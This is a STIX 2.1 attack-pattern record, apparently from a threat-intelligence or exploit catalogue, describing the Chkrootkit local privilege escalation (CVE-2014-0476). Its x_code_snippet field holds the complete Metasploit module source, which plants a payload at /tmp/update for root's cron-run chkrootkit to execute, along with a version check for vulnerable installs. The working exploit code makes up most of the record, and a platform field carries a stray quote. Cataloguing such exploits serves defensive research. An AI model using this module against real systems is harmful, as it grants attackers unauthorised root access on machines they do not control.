{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--40392dd3-8057-4c2a-ab25-729ffb9d56db",
    "created": "2024-08-14T17:14:25.972587Z",
    "modified": "2024-08-14T17:14:25.972591Z",
    "name": "Chkrootkit Local Privilege Escalation",
    "description": " Chkrootkit before 0.50 will run any executable file named /tmp/update as root, allowing a trivial privilege escalation.  WfsDelay is set to 24h, since this is how often a chkrootkit scan is scheduled by default. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/local/chkrootkit.rb",
            "external_id": "chkrootkit.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-0476"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2014/q2/430"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n\n  # This could also be Excellent, but since it requires\n  # up to one day to pop a shell, let's set it to Manual instead.\n  Rank = ManualRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Chkrootkit Local Privilege Escalation',\n        'Description' => %q{\n          Chkrootkit before 0.50 will run any executable file named /tmp/update\n          as root, allowing a trivial privilege escalation.\n\n          WfsDelay is set to 24h, since this is how often a chkrootkit scan is\n          scheduled by default.\n        },\n        'Author' => [\n          'Thomas Stangner', # Original exploit\n          'Julien \"jvoisin\" Voisin' # Metasploit module\n        ],\n        'References' => [\n          ['CVE', '2014-0476'],\n          ['OSVDB', '107710'],\n          ['EDB', '33899'],\n          ['BID', '67813'],\n          ['URL', 'https://seclists.org/oss-sec/2014/q2/430']\n        ],\n        'DisclosureDate' => '2014-06-04',\n        'License' => MSF_LICENSE,\n        'Platform' => 'unix',\n        'Arch' => ARCH_CMD,\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'Privileged' => true,\n        'Stance' => Msf::Exploit::Stance::Passive,\n        'Targets' => [['Automatic', {}]],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => { 'WfsDelay' => 24.hours.seconds.to_i },\n        'Notes' => {\n          'Reliability' => [REPEATABLE_SESSION],\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('CHKROOTKIT', [true, 'Path to chkrootkit', '/usr/sbin/chkrootkit'])\n    ])\n  end\n\n  def check\n    version = cmd_exec(\"#{datastore['CHKROOTKIT']} -V 2>&1\")\n\n    if version =~ /chkrootkit version 0\\.[1-4]/\n      CheckCode::Appears\n    else\n      CheckCode::Safe\n    end\n  end\n\n  def exploit\n    print_warning('Rooting depends on the crontab (this could take a while)')\n\n    write_file('/tmp/update', \"#!/bin/sh\\n(#{payload.encoded}) &\\n\")\n    cmd_exec('chmod +x /tmp/update')\n    register_file_for_cleanup('/tmp/update')\n\n    print_status('Payload written to /tmp/update')\n    print_status('Waiting for chkrootkit to run via cron...')\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-06-04",
    "x_mitre_platforms": [
        "unix'"
    ]
}